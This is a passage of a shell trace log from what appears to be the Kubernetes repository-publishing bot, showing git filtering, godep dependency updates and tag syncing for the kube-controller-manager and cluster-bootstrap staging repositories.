dst_old_commit=481b4013cbb6e646199fc8fe6d2776dc0f8fcab3\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,apiserver:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,apiserver:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/kube-controller-manager\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiserver/\") or . == \"k8s.io/apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/kube-controller-manager/\") or . == \"k8s.io/kube-controller-manager\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,apiserver:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ '[' -z a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ']'\n>\t++ git-find-merge a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 'a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50..upstream-branch --ancestry-path\n>\t+++ git rev-parse a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ local k_last_kube_merge=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.\n>\t++ look -b a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ../kube-commits-apimachinery-master\n>\tChecking out k8s.io/apimachinery to cdac837abb323d610ee074068a16915651f888dd\n>\t+ '[' -z cdac837abb323d610ee074068a16915651f888dd ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to cdac837abb323d610ee074068a16915651f888dd'\n>\t+ git checkout -q cdac837abb323d610ee074068a16915651f888dd\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=apiserver\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.'\n>\t+ local k_commit=\n>\tLooking up which commit in the master branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50.\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ../kube-commits-apiserver-master\n>\t+ '[' -z 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5 ']'\n>\t+ pushd ../apiserver\n>\tChecking out k8s.io/apiserver to 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5\n>\t+ echo 'Checking out k8s.io/apiserver to 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5'\n>\t+ git checkout -q 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\tGodeps.json hasn't changed!\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3\n>\tRemove redundant godep commits on-top of 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3.\n>\t+ echo 'Remove redundant godep commits on-top of 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3.'\n>\t+ git reset --soft -q 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/kube-controller-manager\n>\t+ local repo=kube-controller-manager\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '481b401 Merge pull request #68195 from luxas/consolidate_componentconfig_code_standards' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-kube-controller-manager-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-kube-controller-manager-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=481b4013cbb6e646199fc8fe6d2776dc0f8fcab3\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-controller-manager-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-controller-manager-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-kube-controller-manager-master.sh --dependencies apimachinery:master,apiserver:master --mapping-output-file '../tag-kube-controller-manager-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"master\" at 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3 because \"kubernetes-1.10.0-alpha.3\" seems to be relevant.\n>\t++ git rev-parse master\n>\t+ '[' 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3 '!=' 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3 ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[09 Oct 18 08:18 UTC]: Successfully constructed master\n>[09 Oct 18 08:18 UTC]: /publish_scripts/construct.sh kube-controller-manager release-1.12 release-1.12 apimachinery:release-1.12,apiserver:release-1.12  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-controller-manager kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  243557ba3da96995db4f8efbc756fc935d074739\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-controller-manager\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-controller-manager\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=243557ba3da96995db4f8efbc756fc935d074739\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 481b4013cbb6e646199fc8fe6d2776dc0f8fcab3\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=243557ba3da96995db4f8efbc756fc935d074739\n>\t+ '[' 243557ba3da96995db4f8efbc756fc935d074739 '!=' 243557ba3da96995db4f8efbc756fc935d074739 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=7585de142f540d0e0fc5c986d4e3aea354ff97c3\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-controller-manager-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-controller-manager-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-kube-controller-manager-release-1.12.sh --dependencies apimachinery:release-1.12,apiserver:release-1.12 --mapping-output-file '../tag-kube-controller-manager-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"release-1.12\" at 7585de142f540d0e0fc5c986d4e3aea354ff97c3 because \"kubernetes-1.10.0-alpha.1\" seems to be relevant.\n>\t++ git rev-parse release-1.12\n>\t+ '[' 7585de142f540d0e0fc5c986d4e3aea354ff97c3 '!=' 7585de142f540d0e0fc5c986d4e3aea354ff97c3 ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[09 Oct 18 08:18 UTC]: Successfully constructed release-1.12\n>[09 Oct 18 08:18 UTC]: Successfully ensured /go-workspace/src/k8s.io/cluster-bootstrap exists\n>[09 Oct 18 08:18 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Oct 18 08:18 UTC]: /publish_scripts/construct.sh cluster-bootstrap master master apimachinery:master,api:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/cluster-bootstrap kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  a34123d9c3e933b662bf0a3cb2c427f774154b01\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=cluster-bootstrap\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,api:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/cluster-bootstrap\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=a34123d9c3e933b662bf0a3cb2c427f774154b01\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 345cb50e92869ee605a0d9b20f92ebe419a529e2\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=f9acfd8e384488d2216b18196152dcb7b3cc92d8\n>\t+ '[' f9acfd8e384488d2216b18196152dcb7b3cc92d8 '!=' a34123d9c3e933b662bf0a3cb2c427f774154b01 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''a34123d9c3e933b662bf0a3cb2c427f774154b01'\\'' to '\\''f9acfd8e384488d2216b18196152dcb7b3cc92d8'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from 'a34123d9c3e933b662bf0a3cb2c427f774154b01' to 'f9acfd8e384488d2216b18196152dcb7b3cc92d8'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/cluster-bootstrap master master apimachinery:master,api:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/cluster-bootstrap\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,api:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t345cb50e92869ee605a0d9b20f92ebe419a529e2\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 9 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit 345cb50e92869ee605a0d9b20f92ebe419a529e2.\n>\t+ echo 'Starting at existing master commit 345cb50e92869ee605a0d9b20f92ebe419a529e2.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit f9acfd8e384488d2216b18196152dcb7b3cc92d8.\n>\t+ echo 'Checked out source commit f9acfd8e384488d2216b18196152dcb7b3cc92d8.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ '[' -z c179a9c9df4bfb6421258a5f31da9f595474ada4 ']'\n>\t++ git-find-merge c179a9c9df4bfb6421258a5f31da9f595474ada4 upstream/master\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'c179a9c9df4bfb6421258a5f31da9f595474ada4^1..upstream/master' --first-parent\n>\t+++ git rev-list c179a9c9df4bfb6421258a5f31da9f595474ada4..upstream/master --ancestry-path\n>\t+++ git rev-parse c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ local k_base_merge=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ '[' -z c179a9c9df4bfb6421258a5f31da9f595474ada4 ']'\n>\t+ git branch -f filtered-branch-base c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/cluster-bootstrap.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/cluster-bootstrap.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/cluster-bootstrap 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/cluster-bootstrap\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\tRunning git filter-branch ...\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/cluster-bootstrap -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=5cf4b97b414afd0a3a203bc0d3798d7ba6b7979e\n>\t++ git log --first-parent --format=%H --reverse 5cf4b97b414afd0a3a203bc0d3798d7ba6b7979e..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=345cb50e92869ee605a0d9b20f92ebe419a529e2\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=345cb50e92869ee605a0d9b20f92ebe419a529e2\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 345cb50e92869ee605a0d9b20f92ebe419a529e2 '!=' 345cb50e92869ee605a0d9b20f92ebe419a529e2 ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,api:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,api:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=345cb50e92869ee605a0d9b20f92ebe419a529e2\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,api:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,api:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/cluster-bootstrap\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cluster-bootstrap/\") or . == \"k8s.io/cluster-bootstrap\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ '[' -z c179a9c9df4bfb6421258a5f31da9f595474ada4 ']'\n>\t++ git-find-merge c179a9c9df4bfb6421258a5f31da9f595474ada4 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 